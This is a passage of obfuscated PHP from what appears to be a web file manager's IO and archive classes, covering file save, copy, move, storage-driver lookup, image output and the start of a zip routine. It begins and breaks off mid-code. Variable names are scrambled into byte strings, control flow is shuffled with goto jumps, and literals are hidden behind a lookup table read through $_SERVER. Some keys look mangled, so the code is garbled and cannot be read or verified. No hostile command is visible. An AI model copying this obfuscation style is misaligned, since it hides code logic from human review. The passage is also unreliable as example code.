} public static function saveFile($BÔ×½ß²Í, $få®‰¦–ù, $fåÃÏÇ¹Áñ = true) { goto B—ÔÊ²§¬Ù; dø˜¸ÀïòÜ: $eÃé³ƒÕÑ³ = $aö¡Õ¦÷«->pathFather($få®‰¦–ù); $CØµÕÊ˜Ê› = !0; if (!$fåÃÏÇ¹Áñ && self::driverIsSame($D¬Š ã†‹ö, $aö¡Õ¦÷«)) { $CØµÕÊ˜Ê› = !1; } goto fæöŠŸÌƒ; B—ÔÊ²§¬Ù: $e–×Ì÷°Ì =& $_SERVER[”Ì÷ñ­î¸]; $Eù¨îâ¸· = self::info($få®‰¦–ù); $D¬Š ã†‹ö = self::driverMake($BÔ×½ß²Í); goto d˜¿§ƒÜÀ; fæöŠŸÌƒ: $f÷¹ œôÌ¢ = self::copyFile($D¬Š ã†‹ö, $BÔ×½ß²Í, $aö¡Õ¦÷«, $eÃé³ƒÕÑ³, $Eù¨îâ¸·[$e–×Ì÷°Ì[28]], $CØµÕÊ˜Ê›); if ($DïçÁ×àí½) { $f÷¹ œôÌ¢ = $DïçÁ×àí½->getPathOuter($f÷¹ œôÌ¢); } return $f÷¹ œôÌ¢; goto AéŒ–åï; d˜¿§ƒÜÀ: $aö¡Õ¦÷« = self::driverMake($få®‰¦–ù); $DïçÁ×àí½ = !1; if ($aö¡Õ¦÷«->pathParse[$e–×Ì÷°Ì[998]]) { $B†´“à‚â¤ = $aö¡Õ¦÷«->pathParse[$e–×Ì÷°Ì[998]]; $DïçÁ×àí½ = $aö¡Õ¦÷«; $aö¡Õ¦÷« = self::driverMake($B†´“à‚â¤); } goto dø˜¸ÀïòÜ; AéŒ–åï: } private static function copyMove($a«ùƒŞóÔ¶, $D´ ­Š°¶, $c×ö–ÌÖÂÈ, $Bñİ¼Í„é, $Bâ®î…¬ª = false) { goto e©ç°ìó…˜; Fƒàö˜Æ‘İ: $Bœ²¬„—ìæ = !1; if ($FÏ»ËÓŠêÅ->pathParse[$b‘¥§ÑŒãè[998]]) { $D´ ­Š°¶ = $FÏ»ËÓŠêÅ->pathParse[$b‘¥§ÑŒãè[998]]; $Bœ²¬„—ìæ = $FÏ»ËÓŠêÅ; $FÏ»ËÓŠêÅ = self::driverMake($D´ ­Š°¶); } self::check($b–Å´š‹ÍÍ, $a«ùƒŞóÔ¶, $FÏ»ËÓŠêÅ, $D´ ­Š°¶); goto C‘¯ˆìã”; BĞÍª·Òê¹: if ($Bœ²¬„—ìæ) { $c»è®É‡™Ö = $Bœ²¬„—ìæ->getPathOuter($c»è®É‡™Ö); } return $c»è®É‡™Ö; goto E‰öÌ©å¶ˆ; AñàËâ§¾œ: $e÷§–õ­‘‰ = $b–Å´š‹ÍÍ->isFile($a«ùƒŞóÔ¶); if (!$e÷§–õ­‘‰ && $FÏ»ËÓŠêÅ->getType() == $b‘¥§ÑŒãè[695] && $b–Å´š‹ÍÍ->getType() == $b‘¥§ÑŒãè[102]) { $c»è®É‡™Ö = $FÏ»ËÓŠêÅ->copyFolderFromIO($b–Å´š‹ÍÍ, $a«ùƒŞóÔ¶, $D´ ­Š°¶, $c×ö–ÌÖÂÈ, $dã«¾¿ë·˜, $Bâ®î…¬ª); } else { $c»è®É‡™Ö = self::copyPath($b–Å´š‹ÍÍ, $a«ùƒŞóÔ¶, $FÏ»ËÓŠêÅ, $D´ ­Š°¶, $c×ö–ÌÖÂÈ, $dã«¾¿ë·˜, $e÷§–õ­‘‰, $Bâ®î…¬ª); } if ($c»è®É‡™Ö && $dã«¾¿ë·˜) { $b–Å´š‹ÍÍ->remove($a«ùƒŞóÔ¶); } goto BĞÍª·Òê¹; e©ç°ìó…˜: $b‘¥§ÑŒãè =& $_SERVER[”Ì÷ñ­î¸]; if (!$a«ùƒŞóÔ¶ || $a«ùƒŞóÔ¶ == $b‘¥§ÑŒãè[8] || !$D´ ­Š°¶) { return !1; } ignore_timeout(); goto c‰Ş·¤¶›¥; c‰Ş·¤¶›¥: $b–Å´š‹ÍÍ = self::driverMake($a«ùƒŞóÔ¶); $FÏ»ËÓŠêÅ = self::driverMake($D´ ­Š°¶); $dã«¾¿ë·˜ = $Bñİ¼Í„é == $b‘¥§ÑŒãè[492]; goto Fƒàö˜Æ‘İ; C‘¯ˆìã”: Hook::trigger($b‘¥§ÑŒãè[72], $b–Å´š‹ÍÍ, $a«ùƒŞóÔ¶, $FÏ»ËÓŠêÅ, $D´ ­Š°¶); $C¬ß·‰á¯ò = self::driverIsSame($b–Å´š‹ÍÍ, $FÏ»ËÓŠêÅ); if ($C¬ß·‰á¯ò) { if ($Bñİ¼Í„é == $b‘¥§ÑŒãè[492] && trim($D´ ­Š°¶, $b‘¥§ÑŒãè[8]) == trim($FÏ»ËÓŠêÅ->pathFather($a«ùƒŞóÔ¶), $b‘¥§ÑŒãè[8])) { return $FÏ»ËÓŠêÅ->getPathOuter($a«ùƒŞóÔ¶); } if (method_exists($FÏ»ËÓŠêÅ, $Bñİ¼Í„é)) { return $FÏ»ËÓŠêÅ->{$Bñİ¼Í„é}($a«ùƒŞóÔ¶, $D´ ­Š°¶, $c×ö–ÌÖÂÈ); } } goto AñàËâ§¾œ; E‰öÌ©å¶ˆ: } private static function check($câÅ›©à·¢, $bì¾öô®Æ, $f¶Íµ…˜åº, &$EÕä‰½á†) { $cÓóÂßÇ“ñ =& $_SERVER[”Ì÷ñ­î¸]; if (self::driverIsSame($câÅ›©à·¢, $f¶Íµ…˜åº) && $câÅ›©à·¢->isFolder($bì¾öô®Æ) && $câÅ›©à·¢->isParentOf($bì¾öô®Æ, $EÕä‰½á†)) { show_json(LNG($cÓóÂßÇ“ñ[999]), !1); } if (!$câÅ›©à·¢->exist($bì¾öô®Æ)) { show_json(LNG($cÓóÂßÇ“ñ[101]), !1); } } private static function copyPath($eË¼‰ïïÚ×, $c˜ŞÅéáƒ, $cÛ¢ŒçùÕÍ, $c„š’¢æ¤‰, $Cß¥–ë°ï, $f¹æí™‰³„, $D«‹ˆ‡İ™ñ, $b£Ôê£¥­¿ = false) { goto c…±·ñåÏ; c…±·ñåÏ: $FÁ…é­ø¾å =& $_SERVER[”Ì÷ñ­î¸]; $AÀ¢º’’Ü = $b£Ôê£¥­¿ ? $b£Ôê£¥­¿ : $eË¼‰ïïÚ×->getPathName($eË¼‰ïïÚ×->pathThis($c˜ŞÅéáƒ)); if ($Cß¥–ë°ï) { $eóŠ§Ò²­Ø = $cÛ¢ŒçùÕÍ->fileNameExist($c„š’¢æ¤‰, $AÀ¢º’’Ü); $AÀ¢º’’Ü = $cÛ¢ŒçùÕÍ->fileNameAuto($c„š’¢æ¤‰, $AÀ¢º’’Ü, $Cß¥–ë°ï, !$D«‹ˆ‡İ™ñ); $Cß¥–ë°ï = $eóŠ§Ò²­Ø ? $Cß¥–ë°ï : !1; } goto a¹ÈÀÇóî; a¹ÈÀÇóî: if ($D«‹ˆ‡İ™ñ) { return self::copyFile($eË¼‰ïïÚ×, $c˜ŞÅéáƒ, $cÛ¢ŒçùÕÍ, $c„š’¢æ¤‰, $AÀ¢º’’Ü, $f¹æí™‰³„); } if ($Cß¥–ë°ï == REPEAT_RENAME_FOLDER) { $Cß¥–ë°ï = !1; } $E‰Ìß´Š¦Ó = rtrim($c„š’¢æ¤‰, $FÁ…é­ø¾å[8]) . $FÁ…é­ø¾å[8] . $AÀ¢º’’Ü; goto DÎ®Üˆ¿Š·; f±…„ãµä©: $eİÃ¤ †¯ä = array_merge($fº†­†¶¶Ì[$FÁ…é­ø¾å[73]], $fº†­†¶¶Ì[$FÁ…é­ø¾å[74]]); foreach ($eİÃ¤ †¯ä as $Bø¼µ‘Ô¹µ) { $Bˆ´¨°¥Ï = $Bø¼µ‘Ô¹µ[$FÁ…é­ø¾å[29]] == $FÁ…é­ø¾å[167]; $c˜ŞÅéáƒ = $eË¼‰ïïÚ×->getPathInner($Bø¼µ‘Ô¹µ[$FÁ…é­ø¾å[75]]); $DĞºß†Ÿå = self::copyPath($eË¼‰ïïÚ×, $c˜ŞÅéáƒ, $cÛ¢ŒçùÕÍ, $c„š’¢æ¤‰, $Cß¥–ë°ï, $f¹æí™‰³„, $Bˆ´¨°¥Ï); if (!$DĞºß†Ÿå) { write_log($FÁ…é­ø¾å[1000] . $c˜ŞÅéáƒ . $FÁ…é­ø¾å[1001] . $c„š’¢æ¤‰, $FÁ…é­ø¾å[1002]); } } return $a¡Š“ƒ¬òò; goto a§£¹Ÿ×É; DÎ®Üˆ¿Š·: $a¡Š“ƒ¬òò = $cÛ¢ŒçùÕÍ->mkdir($cÛ¢ŒçùÕÍ->getPath($E‰Ìß´Š¦Ó)); $c„š’¢æ¤‰ = $cÛ¢ŒçùÕÍ->getPathInner($a¡Š“ƒ¬òò); $fº†­†¶¶Ì = $eË¼‰ïïÚ×->listPath($c˜ŞÅéáƒ, !0); goto f±…„ãµä©; a§£¹Ÿ×É: } private static function copyFile($Cí–¼¼æ», $E‰£×„¿, $eİğÑÉ†ÖŞ, $dù†¯ÏØ„Â, $C½ğŒÅˆœ—, $cèºÀ³Æ©•) { goto d„Ş÷’¤ºí; C–ÀŞ•é¯ø: $BÇŠÁù“Æ = $Cí–¼¼æ»->iconvApp($BÇŠÁù“Æ); $Cí•ì¢¶˜ = $eİğÑÉ†ÖŞ->upload($dù†¯ÏØ„Â, $BÇŠÁù“Æ, $cèºÀ³Æ©•); self::remove($bë†¸à¼ . $D‡Ÿ†œÓ×ø); goto Céëõõ‹; d„Ş÷’¤ºí: $Cø‰Ğ´‘èĞ =& $_SERVER[”Ì÷ñ­î¸]; $dù†¯ÏØ„Â = $eİğÑÉ†ÖŞ->getPath(rtrim($dù†¯ÏØ„Â, $Cø‰Ğ´‘èĞ[8]) . $Cø‰Ğ´‘èĞ[8] . $C½ğŒÅˆœ—); $D‡Ÿ†œÓ×ø = $Cø‰Ğ´‘èĞ[1003] . time() . rand_string(5); goto B ¹—¯¦Ì; B ¹—¯¦Ì: Hook::trigger($Cø‰Ğ´‘èĞ[1004], $Cí–¼¼æ», $E‰£×„¿, $eİğÑÉ†ÖŞ, $dù†¯ÏØ„Â, $C½ğŒÅˆœ—, $D‡Ÿ†œÓ×ø); if (self::driverIsSame($Cí–¼¼æ», $eİğÑÉ†ÖŞ)) { if ($cèºÀ³Æ©•) { $Cí•ì¢¶˜ = $eİğÑÉ†ÖŞ->moveFile($E‰£×„¿, $dù†¯ÏØ„Â); } else { $Cí•ì¢¶˜ = $eİğÑÉ†ÖŞ->copyFile($E‰£×„¿, $dù†¯ÏØ„Â); } Hook::trigger($Cø‰Ğ´‘èĞ[1005], $Cí–¼¼æ», $E‰£×„¿, $eİğÑÉ†ÖŞ, $dù†¯ÏØ„Â, $C½ğŒÅˆœ—, $Cí•ì¢¶˜); return $Cí•ì¢¶˜; } $bë†¸à¼ = TEMP_FILES; goto bè–•Šµ”–; bè–•Šµ”–: mk_dir($bë†¸à¼); $BÇŠÁù“Æ = $bë†¸à¼ . $D‡Ÿ†œÓ×ø; $BÇŠÁù“Æ = $Cí–¼¼æ»->download($E‰£×„¿, $BÇŠÁù“Æ); goto C–ÀŞ•é¯ø; Céëõõ‹: Hook::trigger($Cø‰Ğ´‘èĞ[1005], $Cí–¼¼æ», $E‰£×„¿, $eİğÑÉ†ÖŞ, $dù†¯ÏØ„Â, $C½ğŒÅˆœ—, $Cí•ì¢¶˜); return $Cí•ì¢¶˜; goto Dµ›Æ‘°¦§; Dµ›Æ‘°¦§: } public static function pathFather($CÂ‡Í•™Ÿ) { $f¦µ¿·Ï™‡ = IO::init($CÂ‡Í•™Ÿ); $E“ÏŸ¿Ğ’â = $f¦µ¿·Ï™‡->pathFather($f¦µ¿·Ï™‡->path); return $f¦µ¿·Ï™‡->getPathOuter($E“ÏŸ¿Ğ’â); } public static function fileOut($AéŸâ½ƒ, $aŸ±»–¤ˆ¿ = false, $Dà¿×å£ôÍ = false, $f©¸«ÍŠÂ = '') { $a¯Ñ²×ÌŠô = self::driverMake($AéŸâ½ƒ); if ($a¯Ñ²×ÌŠô->isFileOutServer()) { return $a¯Ñ²×ÌŠô->fileOutServer($AéŸâ½ƒ, $aŸ±»–¤ˆ¿, $Dà¿×å£ôÍ, $f©¸«ÍŠÂ); } return $a¯Ñ²×ÌŠô->fileOut($AéŸâ½ƒ, $aŸ±»–¤ˆ¿, $Dà¿×å£ôÍ, $f©¸«ÍŠÂ); } public static function fileOutImage($e„òµÖÖÄ©, $f²´ÅøÄ = 250) { $DŠˆÏ„¾› = array(250, 600, 1200, 3000); for ($AŸ‡»³›–ä = 0; $AŸ‡»³›–ä < count($DŠˆÏ„¾›); $AŸ‡»³›–ä++) { if ($AŸ‡»³›–ä == 0 && $f²´ÅøÄ <= $DŠˆÏ„¾›[$AŸ‡»³›–ä]) { $f²´ÅøÄ = $DŠˆÏ„¾›[$AŸ‡»³›–ä]; break; } else { if ($f²´ÅøÄ > $DŠˆÏ„¾›[$AŸ‡»³›–ä - 1] && $f²´ÅøÄ <= $DŠˆÏ„¾›[$AŸ‡»³›–ä]) { $f²´ÅøÄ = $DŠˆÏ„¾›[$AŸ‡»³›–ä]; break; } else { if ($AŸ‡»³›–ä == count($DŠˆÏ„¾›) - 1 && $f²´ÅøÄ > $DŠˆÏ„¾›[$AŸ‡»³›–ä]) { $f²´ÅøÄ = $DŠˆÏ„¾›[$AŸ‡»³›–ä]; break; } } } } $fÍ¶¦…Îì = self::driverMake($e„òµÖÖÄ©); if ($fÍ¶¦…Îì->isFileOutServer()) { return $fÍ¶¦…Îì->fileOutImageServer($e„òµÖÖÄ©, $f²´ÅøÄ); } return $fÍ¶¦…Îì->fileOutImage($e„òµÖÖÄ©, $f²´ÅøÄ); } private static function driverIsSame($C°ÖÚóÄõ, $cÖ©¦‰êÖë) { goto fÜ¤Öá““; e…ì¯Ê“‰: if ($EÛÍ™ÖšŸÃ != $e¸ğ†ãĞ‘¼) { return !1; } if ($EÛÍ™ÖšŸÃ == $bÄ«’¨øÒÄ[695]) { return !0; } if ($EÛÍ™ÖšŸÃ == $bÄ«’¨øÒÄ[102]) { return !0; } goto f²ÃãÔ¡Şæ; fÜ¤Öá““: $bÄ«’¨øÒÄ =& $_SERVER[”Ì÷ñ­î¸]; $EÛÍ™ÖšŸÃ = $C°ÖÚóÄõ->getType(); $e¸ğ†ãĞ‘¼ = $cÖ©¦‰êÖë->getType(); goto e…ì¯Ê“‰; f²ÃãÔ¡Şæ: if ($C°ÖÚóÄõ->pathDriver == $cÖ©¦‰êÖë->pathDriver) { return !0; } return !1; goto DÎÔ›óéÕ…; DÎÔ›óéÕ…: } public static function copyUpdate($bË¦„Ê©, $E±‰ñ¿×ø”) { goto a–×š›Şæ; D¨ßôÕÕò: Hook::trigger($a‰Ê•Õ¤‚¬[1009], $bË¦„Ê©, $E±‰ñ¿×ø”, $DµĞ“ÛÙ); foreach ($fŞ°˜šĞ”ì as $dÁ¼ó»ªªë) { IO::mkdir($dÁ¼ó»ªªë); } foreach ($EÉ´Õ¦äÎÔ as $dÁ¼ó»ªªë) { IO::copy($dÁ¼ó»ªªë[$a‰Ê•Õ¤‚¬[1006]], $dÁ¼ó»ªªë[$a‰Ê•Õ¤‚¬[1007]], REPEAT_REPLACE); } goto AÛŠ…šòßŸ; a–×š›Şæ: $a‰Ê•Õ¤‚¬ =& $_SERVER[”Ì÷ñ­î¸]; if (!IO::exist($bË¦„Ê©)) { return !1; } if (!IO::exist($E±‰ñ¿×ø”)) { IO::mkdir($E±‰ñ¿×ø”); } goto Bæ¶Ô¼Ş°; CÃ³‚……Üõ: $fŞ°˜šĞ”ì = array(); foreach ($D½»ˆ§·²  as $cäĞãœ†Æ“ => $dÁ¼ó»ªªë) { if (isset($cŠ‚®²Â›†[$cäĞãœ†Æ“])) { if ($dÁ¼ó»ªªë[$a‰Ê•Õ¤‚¬[76]] == 1) { continue; } if ($cŠ‚®²Â›†[$cäĞãœ†Æ“][$a‰Ê•Õ¤‚¬[77]] == $dÁ¼ó»ªªë[$a‰Ê•Õ¤‚¬[77]]) { continue; } } if ($dÁ¼ó»ªªë[$a‰Ê•Õ¤‚¬[76]] == 1) { $fŞ°˜šĞ”ì[] = $E±‰ñ¿×ø” . $a‰Ê•Õ¤‚¬[8] . $cäĞãœ†Æ“; continue; } $aóÊì±ÏíÂ = strstr(trim($cäĞãœ†Æ“, $a‰Ê•Õ¤‚¬[8]), $a‰Ê•Õ¤‚¬[8]) ? get_path_father($cäĞãœ†Æ“) : $a‰Ê•Õ¤‚¬[33]; $EÉ´Õ¦äÎÔ[] = array($a‰Ê•Õ¤‚¬[1006] => $dÁ¼ó»ªªë[$a‰Ê•Õ¤‚¬[75]], $a‰Ê•Õ¤‚¬[1007] => rtrim($E±‰ñ¿×ø”, $a‰Ê•Õ¤‚¬[8]) . $a‰Ê•Õ¤‚¬[8] . $aóÊì±ÏíÂ, $a‰Ê•Õ¤‚¬[1008] => $dÁ¼ó»ªªë); } $DµĞ“ÛÙ = array($a‰Ê•Õ¤‚¬[167] => $EÉ´Õ¦äÎÔ, $a‰Ê•Õ¤‚¬[76] => $fŞ°˜šĞ”ì); goto D¨ßôÕÕò; Bæ¶Ô¼Ş°: $D½»ˆ§·²  = self::_listAll($bË¦„Ê©); $cŠ‚®²Â›† = self::_listAll($E±‰ñ¿×ø”); $EÉ´Õ¦äÎÔ = array(); goto CÃ³‚……Üõ; AÛŠ…šòßŸ: } private static function _listAll($Cæ¬±·×ö) { $cøéÌ‡Æöğ =& $_SERVER[”Ì÷ñ­î¸]; $Cæ¬±·×ö = KodIO::clear($Cæ¬±·×ö); $aºˆ•²©îÁ = IO::listAll($Cæ¬±·×ö); foreach ($aºˆ•²©îÁ as &$EÓ³ÂòôÛÖ) { $FõšÍÒĞäŞ = substr($EÓ³ÂòôÛÖ[$cøéÌ‡Æöğ[75]], strlen($Cæ¬±·×ö)); $EÓ³ÂòôÛÖ[$cøéÌ‡Æöğ[1010]] = trim($FõšÍÒĞäŞ, $cøéÌ‡Æöğ[8]); } return array_to_keyvalue($aºˆ•²©îÁ, $cøéÌ‡Æöğ[1010]); } public static function fileSubstr($C£ÚÖƒš×¸, $E•‡¸ˆéñò, $Bß™ã©òÜÒ = false) { goto eÂ˜”‘¶²Ø; D‰·ìÅ¦: if ($E•‡¸ˆéñò + $Bß™ã©òÜÒ > $dôñÌ÷´„—) { $Bß™ã©òÜÒ = $dôñÌ÷´„— - $E•‡¸ˆéñò; } if ($Bß™ã©òÜÒ <= 0) { return $_SERVER[”Ì÷ñ­î¸][33]; } if ($E•‡¸ˆéñò < 0 || $E•‡¸ˆéñò >= $dôñÌ÷´„— || $Bß™ã©òÜÒ > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\x65\122\x65\141\144\x20\x65\x72\162\157\x72\41\x20\x73\164\141\162\x74\x3d{$E•‡¸ˆéñò}\73\x6c\145\x6e\x67\x74\x68\75{$Bß™ã©òÜÒ}\x3b\40\163\x69\x7a\145\75{$dôñÌ÷´„—}\x3b"); } goto aÎ’Ôñ®‡„; aÎ’Ôñ®‡„: return $Aå‘ì«ôâğ->fileSubstr($C£ÚÖƒš×¸, $E•‡¸ˆéñò, $Bß™ã©òÜÒ); goto eî ŸÎ¹ïî; A¼£Ô¬Ãò: $bìç¤ğóáÂ = $Bß™ã©òÜÒ; if ($E•‡¸ˆéñò < 0) { $E•‡¸ˆéñò = $dôñÌ÷´„— + $E•‡¸ˆéñò; } if ($Bß™ã©òÜÒ === !1) { $Bß™ã©òÜÒ = $dôñÌ÷´„— - $E•‡¸ˆéñò; } goto D‰·ìÅ¦; eÂ˜”‘¶²Ø: $Aå‘ì«ôâğ = self::driverMake($C£ÚÖƒš×¸); $dôñÌ÷´„— = $Aå‘ì«ôâğ->size($C£ÚÖƒš×¸); $a®Ç¿Í¥À¬ = $E•‡¸ˆéñò; goto A¼£Ô¬Ãò; eî ŸÎ¹ïî: } private static function driverMake(&$E·ÄÈ®È„») { goto b°øÁé¼è; eêÂó‘æÙî: if ($aĞ­Ğ°ã’ô[$eôÛÔï±[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aĞ­Ğ°ã’ô[$eôÛÔï±[367]]]) { return !1; } $E·ÄÈ®È„» = $aĞ­Ğ°ã’ô[$eôÛÔï±[1011]]; $EİÕÖÅÑ‡£ = self::driverGet($aĞ­Ğ°ã’ô, $E·ÄÈ®È„»); goto C¤ß…³âæ; C¤ß…³âæ: return $EİÕÖÅÑ‡£; goto DøÏ¶óªĞè; b°øÁé¼è: $eôÛÔï± =& $_SERVER[”Ì÷ñ­î¸]; $aĞ­Ğ°ã’ô = KodIO::parse($E·ÄÈ®È„»); if (!self::$driverListSystem) { $dó¥ÉÚ¥»Õ = Model($eôÛÔï±[705])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($dó¥ÉÚ¥»Õ, $eôÛÔï±[367]); } goto eêÂó‘æÙî; DøÏ¶óªĞè: } private static function driverGet($fÖ¸ˆô…õ, &$b¨àƒ›–Óñ) { goto D’«Öƒ¹ï¦; C½âïÙ‚æÁ: $EòÛ£Ş³æÛ->path = $b¨àƒ›–Óñ; return $EòÛ£Ş³æÛ; goto fŸˆÓ†æÒ; D’«Öƒ¹ï¦: $bí—Şˆ­³« =& $_SERVER[”Ì÷ñ­î¸]; $aóÇ‡Êô…Ç = $fÖ¸ˆô…õ[$bí—Şˆ­³«[1012]]; $dĞÚòõ¬ßÃ = $fÖ¸ˆô…õ[$bí—Şˆ­³«[367]]; goto b¾œŞ—Ä’”; b¾œŞ—Ä’”: switch ($fÖ¸ˆô…õ[$bí—Şˆ­³«[29]]) { case KodIO::KOD_IO: $AƒùÉàÉõ = self::$driverListSystem[$dĞÚòõ¬ßÃ]; break; case KodIO::KOD_SOURCE: $b¨àƒ›–Óñ = $dĞÚòõ¬ßÃ . $b¨àƒ›–Óñ; $AƒùÉàÉõ = array($bí—Şˆ­³«[1013] => $bí—Şˆ­³«[1014], $bí—Şˆ­³«[6] => $fÖ¸ˆô…õ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Dã“Íâ Ü¸ = $GLOBALS[$bí—Şˆ­³«[1015]]; self::$driverListUser = array_to_keyvalue($Dã“Íâ Ü¸, $bí—Şˆ­³«[367]); } $AƒùÉàÉõ = self::$driverListUser[$dĞÚòõ¬ßÃ]; break; case KodIO::KOD_SHARE_LINK: $AƒùÉàÉõ = array($bí—Şˆ­³«[1013] => $bí—Şˆ­³«[1016], $bí—Şˆ­³«[6] => $fÖ¸ˆô…õ); $b‡²å¢¹Äù = Action($bí—Şˆ­³«[1017])->sharePathInfo($fÖ¸ˆô…õ[$bí—Şˆ­³«[75]]); $b¨àƒ›–Óñ = $b‡²å¢¹Äù[$bí—Şˆ­³«[369]]; if (!$b‡²å¢¹Äù[$bí—Şˆ­³«[369]]) { $e‚Üø´Œôà = Model($bí—Şˆ­³«[536])->getInfo($b‡²å¢¹Äù[$bí—Şˆ­³«[441]]); $b¨àƒ›–Óñ = KodIO::clear($e‚Üø´Œôà[$bí—Şˆ­³«[1018]] . $fÖ¸ˆô…õ[$bí—Şˆ­³«[1011]]); $fÖ¸ˆô…õ[$bí—Şˆ­³«[439]] = $e‚Üø´Œôà; $fÖ¸ˆô…õ[$bí—Şˆ­³«[998]] = $b¨àƒ›–Óñ; $AƒùÉàÉõ = array($bí—Şˆ­³«[1013] => $bí—Şˆ­³«[1019], $bí—Şˆ­³«[6] => $fÖ¸ˆô…õ); } break; case KodIO::KOD_SHARE_ITEM: $AƒùÉàÉõ = array($bí—Şˆ­³«[1013] => $bí—Şˆ­³«[1020], $bí—Şˆ­³«[6] => $fÖ¸ˆô…õ); $e‚Üø´Œôà = Model($bí—Şˆ­³«[536])->getInfo($fÖ¸ˆô…õ[$bí—Şˆ­³«[367]]); if ($e‚Üø´Œôà[$bí—Şˆ­³«[369]] == $bí—Şˆ­³«[468]) { $b¨àƒ›–Óñ = KodIO::clear($e‚Üø´Œôà[$bí—Şˆ­³«[1018]] . $fÖ¸ˆô…õ[$bí—Şˆ­³«[1011]]); $fÖ¸ˆô…õ[$bí—Şˆ­³«[439]] = $e‚Üø´Œôà; $fÖ¸ˆô…õ[$bí—Şˆ­³«[998]] = $b¨àƒ›–Óñ; $AƒùÉàÉõ = array($bí—Şˆ­³«[1013] => $bí—Şˆ­³«[1021], $bí—Şˆ­³«[6] => $fÖ¸ˆô…õ); } break; default: $b¨àƒ›–Óñ = $fÖ¸ˆô…õ[$bí—Şˆ­³«[75]]; $AƒùÉàÉõ = array($bí—Şˆ­³«[1013] => $bí—Şˆ­³«[1022]); break; } $fé’ÁõÁÜÔ = $fÖ¸ˆô…õ[$bí—Şˆ­³«[75]]; if (!isset(self::$driverCache[$fé’ÁõÁÜÔ])) { $EÖµò«ç = strtolower($AƒùÉàÉõ[$bí—Şˆ­³«[90]]); $F°´ùùÔ„ = $GLOBALS[$bí—Şˆ­³«[6]][$bí—Şˆ­³«[84]][$bí—Şˆ­³«[1023]]; $f¼Èßøƒ¶ = $bí—Şˆ­³«[71] . (isset($F°´ùùÔ„[$EÖµò«ç]) ? $F°´ùùÔ„[$EÖµò«ç] : ucfirst($EÖµò«ç)); if (!class_exists($f¼Èßøƒ¶)) { show_json("{$f¼Èßøƒ¶}\40\x6e\x6f\x74\x20\145\170\151\x73\164\163\41", !1); } $D½†Ë’„Š = isset($AƒùÉàÉõ[$bí—Şˆ­³«[6]]) ? $AƒùÉàÉõ[$bí—Şˆ­³«[6]] : !1; self::$driverCache[$fé’ÁõÁÜÔ] = new $f¼Èßøƒ¶($D½†Ë’„Š); } goto D¿Õœ±³²Ò; A™“–¸Á: if (isset($AƒùÉàÉõ[$bí—Şˆ­³«[6]][$bí—Şˆ­³«[1024]])) { $EòÛ£Ş³æÛ->pathBase = rtrim($AƒùÉàÉõ[$bí—Şˆ­³«[6]][$bí—Şˆ­³«[1024]], $bí—Şˆ­³«[8]) . $bí—Şˆ­³«[8]; $b¨àƒ›–Óñ = $EòÛ£Ş³æÛ->pathBase . ltrim($b¨àƒ›–Óñ, $bí—Şˆ­³«[8]); } $b¨àƒ›–Óñ = $EòÛ£Ş³æÛ->getPath($b¨àƒ›–Óñ); if (isset($fÖ¸ˆô…õ[$bí—Şˆ­³«[998]])) { $b¨àƒ›–Óñ = $fÖ¸ˆô…õ[$bí—Şˆ­³«[998]]; } goto C½âïÙ‚æÁ; D¿Õœ±³²Ò: $EòÛ£Ş³æÛ = self::$driverCache[$fé’ÁõÁÜÔ]; $EòÛ£Ş³æÛ->pathDriver = $aóÇ‡Êô…Ç; $EòÛ£Ş³æÛ->pathBase = $bí—Şˆ­³«[33]; goto A™“–¸Á; fŸˆÓ†æÒ: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $fìÁ‡èœ; if (!$fìÁ‡èœ) { $AÓˆ–óñ›Ü = IO::init($_SERVER[”Ì÷ñ­î¸][8]); } return $AÓˆ–óñ›Ü; } private static function iconvSystem($a²†â¨¡‡®) { return self::local()->iconvSystem($a²†â¨¡‡®); } private static function iconvApp($Dæ™¦ğÒ¥í) { return self::local()->iconvApp($Dæ™¦ğÒ¥í); } public static function zip($e©Û›…ÕÊ÷, $E¤È‰ŒŸ„ = "\x7a\x69\160", $e°‹õ¹ƒ… = '', $c»Ş©ïÁÈó = REPEAT_RENAME) { goto B¾…øÂá‚é; c¼áè¾ª›ë: $D±¤Âƒ®³˜ = !1; if (!$e°‹õ¹ƒ… && $Fñ¸àÇ…åÛ->getType() == $Fà•õ»é…[102]) { $dâÉ¾İÍ¯ô = self::zipFileList($e©Û›…ÕÊ÷); } else { $D±¤Âƒ®³˜ = $e°‹õ¹ƒ… ? $e°‹õ¹ƒ… : TEMP_FILES . $Fà•õ»é…[1025] . time() . rand_string(8) . $Fà•õ»é…[8]; mk_dir($D±¤Âƒ®³˜); $dâÉ¾İÍ¯ô = self::zipFileList($e©Û›…ÕÊ÷, $D±¤Âƒ®³˜); } $A’“ è„ƒá = $Dê“µ°­öê[$Fà•õ»é…[28]]; goto dÙà¡¾ˆÈÈ; fÖ¤Óáá²£: $d… å‘øáë = $dÀ«ÈÚ³³Ï . $A’“ è„ƒá . $Fà•õ»é…[91] . $E¤È‰ŒŸ„; $d… å‘øáë = get_filename_auto($d… å‘øáë, $Fà•õ»é…[33], $c»Ş©ïÁÈó); $aÏ„áÍËÒ‡ = self::iconvSystem($d… å‘øáë); goto Bôèƒ—…’‰; aèÅèÅ­: if (!$a•”È¬Úã) { del_dir($D±¤Âƒ®³˜); show_json(LNG($Fà•õ»é…[1027]), !1); } del_dir($D±¤Âƒ®³˜); return $a•”È¬Úã; goto eö¨í¬‰×; Bôèƒ—…’‰: foreach ($dâÉ¾İÍ¯ô as $bİÄ¾åŠ“ => $b³½ô§Òã›) { $dâÉ¾İÍ¯ô[$bİÄ¾åŠ“] = self::iconvSystem($b³½ô§Òã›); } KodArchive::create($aÏ„áÍËÒ‡, $dâÉ¾İÍ¯ô); if (!IO::exist($d… å‘øáë)) { if ($D±¤Âƒ®³˜) { del_dir($D±¤Âƒ®³˜); } show_json(LNG($Fà•õ»é…[1027]), !1); } goto B‰Å…§‰å; B‰Å…§‰å: if ($e°‹õ¹ƒ… || !$D±¤Âƒ®³˜) { if ($D±¤Âƒ®³˜ && strstr($D±¤Âƒ®³˜, TEMP_FILES)) { $AÉÍ‡Ï‡ = $dâÉ¾İÍ¯ô = array(); recursion_dir($dÀ«ÈÚ³³Ï, $AÉÍ‡Ï‡, $dâÉ¾İÍ¯ô, 0); foreach ($AÉÍ‡Ï‡ as $d²àÒÈæ· ) { del_dir($d²àÒÈæ· ); } foreach ($dâÉ¾İÍ¯ô as 